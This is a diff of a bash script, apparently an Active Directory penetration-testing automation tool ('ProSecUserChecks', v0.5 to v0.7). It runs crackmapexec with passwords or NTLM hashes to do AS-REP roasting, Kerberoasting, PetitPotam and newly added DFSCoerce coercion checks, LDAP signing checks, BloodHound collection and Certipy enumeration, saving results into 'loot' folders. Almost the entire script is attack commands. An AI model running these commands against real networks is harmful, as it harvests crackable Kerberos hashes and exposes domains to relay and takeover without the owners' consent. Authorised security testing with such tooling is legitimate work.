@@ -1,6 +1,6 @@
  #!/bin/bash
 figlet -w 84 ProSecUserChecks
-echo "v0.5"
+echo "v0.7"
 echo "CME is still buggy u need to press ENTER sometimes!"
 unset USER HASH PASS DOM IP FQDN
 
@@ -134,19 +134,24 @@ then
   echo "ASRep" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # asreproast
-   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_$DOM.txt --kdcHost $FQDN
+   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_$DOM.txt
 
   echo "Kerberoast" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # kerberoast
-   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_$DOM.txt --kdcHost $FQDN
+   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_$DOM.txt
 
   echo "MAQ" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # MAQ  
-   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq_$DOM.txt --kdcHost $FQDN
+   crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq_$DOM.txt
 
-  echo "LDAP Signing" >> /root/output/runtime.txt
+  echo "LDAP Signing with CME" >> /root/output/runtime.txt
+  date >> /root/output/runtime.txt
+ # CME Ldap signing
+  crackmapexec ldap $FQDN -u $USER -p $PASS -d $DOM -M ldap-checker >> /root/output/loot/intern/ldap/signing/ldap_check_$DOM.txt
+
+  echo "LDAP Signing LdapRelayScan" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # ldap signing 
    python3 /opt/LdapRelayScan/LdapRelayScan.py -u $USER -p $PASS -dc-ip $IP -method BOTH >> /root/output/loot/intern/ldap/signing/signig_$DOM.txt
@@ -158,11 +163,11 @@ then
    certipy find -u $USER -p $PASS -target $IP -old-bloodhound
    mv *.zip /root/output/loot/intern/ad
 
-#Python unbuffered reset to default
-unset PYTHONUNBUFFERED   
+ # Python unbuffered reset to default
+  unset PYTHONUNBUFFERED   
   echo "Userchecks Done" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
-exit 0
+ exit 0
 fi
 
 if [ -z $PASS ]
@@ -208,6 +213,11 @@ then
  # petitpotam
    crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M petitpotam >> /root/output/loot/intern/rpc/petit_potam/petitpotam_$FQDN.txt
 
+ echo "DFScoerce" >> /root/output/runtime.txt
+  date >> /root/output/runtime.txt
+ # DFScoerce
+   crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M dfscoerce >> /root/output/loot/intern/rpc/dfscoerce/dfscoerce_$FQDN.txt
+
   echo "Sessions" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # sessions
@@ -216,19 +226,24 @@ then
   echo "ASRep" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # asreproast
-   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_$DOM.txt --kdcHost $FQDN
+   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM --asreproast /root/output/loot/intern/ad/kerberos/asreproast/asrep_$DOM.txt
 
   echo "Kerberoast" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # kerberoast
-   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_$DOM.txt --kdcHost $FQDN
+   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM --kerberoasting /root/output/loot/intern/ad/kerberos/kerberoasting/krb_$DOM.txt
 
   echo "MAQ" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # MAQ  
-   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq_$DOM.txt --kdcHost $FQDN
+   crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM -M MAQ >> /root/output/loot/intern/ad/quota/maq_$DOM.txt
 
-  echo "LDAP Signing" >> /root/output/runtime.txt
+  echo "LDAP Signing with CME" >> /root/output/runtime.txt
+  date >> /root/output/runtime.txt
+ # CME Ldap signing
+  crackmapexec ldap $FQDN -u $USER -H $HASH -d $DOM -M ldap-checker >> /root/output/loot/intern/ldap/signing/ldap_check_$DOM.txt
+
+  echo "LDAP Signing LdapRelayScan" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
  # ldap signing
    python3 /opt/LdapRelayScan/LdapRelayScan.py -u $USER -nthash $HASH -dc-ip $IP -method BOTH > /root/output/loot/intern/ldap/signing/signig_$DOM.txt
@@ -239,10 +254,11 @@ then
    bloodhound-python -u $USER --hashes aad3b435b51404eeaad3b435b51404ee:$HASH -d $DOM -dc $FQDN -w 50 -c all --zip
    certipy find -u $USER -hashes $HASH -target $IP -old-bloodhound
    mv *.zip /root/output/loot/intern/ad
-#Python unbuffered reset to default
-unset PYTHONUNBUFFERED
+
+ # Python unbuffered reset to default
+  unset PYTHONUNBUFFERED
   echo "Userchecks Done" >> /root/output/runtime.txt
   date >> /root/output/runtime.txt
-exit 0    
+ exit 0    
 fi
 exit 0
